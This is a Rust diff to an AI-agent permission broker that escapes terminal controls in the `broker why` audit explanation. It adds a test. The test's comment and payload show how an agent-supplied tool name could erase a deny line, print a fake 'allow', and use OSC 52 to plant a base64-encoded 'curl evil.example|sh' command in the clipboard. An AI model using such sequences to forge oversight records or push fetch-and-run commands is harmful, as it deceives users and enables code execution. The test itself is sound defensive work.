@@ -4,7 +4,13 @@
 use super::{EXIT_BROKER, ctl};
 use audit::{DecisionResult, RequestId, SqliteRecorder, StoredEvent};
 
+/// The explanation as printed: agent-supplied text (verbs, hosts, paths,
+/// tool names) has every terminal control escaped (`term::terminal_safe`).
 pub fn render(events: &[StoredEvent]) -> String {
+    super::term::terminal_safe(&render_raw(events))
+}
+
+fn render_raw(events: &[StoredEvent]) -> String {
     let mut out = String::new();
     for s in events {
         let e = &s.event;
@@ -100,5 +106,43 @@ pub fn why(id: &str) -> i32 {
             eprintln!("broker: {e:#}");
             EXIT_BROKER
         }
+    }
+}
+
+#[cfg(test)]
+mod review_tests {
+    use super::*;
+    use audit::{AuditEvent, ChainHash, EventKind, Reason, SessionId};
+
+    /// Review (I9 point 5, TB1): `broker why` is how the user is told what
+    /// happened, from the log alone. The verb it prints comes from the
+    /// agent's own bytes: an MCP `tools/call` naming a tool the pinned
+    /// manifest lacks is denied `mcp_tool_unknown` with verb
+    /// `mcp.call_tool <server> <name as sent>` (`brokerd/src/mcp/relay.rs`,
+    /// `call`; any unknown JSON-RPC method likewise lands in `mcp.<method>`),
+    /// and a JSON string may hold ESC, BEL and CR. `render` prints the verb
+    /// raw, so the agent writes terminal control sequences into the user's
+    /// terminal: here it erases the deny line and prints an allow, and sets
+    /// the clipboard with OSC 52 (honoured by several terminals). The
+    /// approval view escapes the same classes (`term::terminal_safe`).
+    #[test]
+    fn review_why_does_not_print_agent_controlled_controls_raw() {
+        let tool = "x\r\u{1b}[2K  decision  allow (enforce mode)\u{1b}]52;c;Y3VybCBldmlsLmV4YW1wbGV8c2g=\u{7}\u{9b}31m\u{202e}";
+        let ev = AuditEvent::new(EventKind::RequestDecision)
+            .session(&SessionId::new())
+            .request(&RequestId::new())
+            .deny(Reason::McpToolUnknown, vec![])
+            .detail("layer", "mcp")
+            .detail("verb", format!("mcp.call_tool github {tool}"))
+            .detail("tool", tool);
+        let out = render(&[StoredEvent { seq: 7, event: ev, hash: ChainHash([0; 32]) }]);
+        let raw: Vec<String> = out
+            .chars()
+            .filter(
+                |c| matches!(*c as u32, 0x00..=0x09 | 0x0b..=0x1f | 0x7f..=0x9f | 0x202a..=0x202e | 0x2066..=0x2069),
+            )
+            .map(|c| format!("U+{:04X}", c as u32))
+            .collect();
+        assert!(raw.is_empty(), "`broker why` printed agent-controlled controls raw: {}", raw.join(" "));
     }
 }
